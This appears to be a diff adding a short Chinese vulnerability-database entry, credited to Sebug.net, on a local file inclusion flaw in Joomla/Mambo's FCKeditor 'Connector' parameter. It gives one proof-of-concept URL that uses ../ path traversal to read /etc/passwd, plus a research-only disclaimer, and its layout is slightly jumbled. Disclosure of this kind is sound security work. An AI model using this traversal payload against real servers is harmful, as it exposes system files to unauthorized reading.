@@ -1,0 +1,5 @@
+Joomla Mambo FCKeditor模块'Connector'本地文件包含漏洞
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.http://www.example.com/mambots/editors/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../../../../etc/passwd
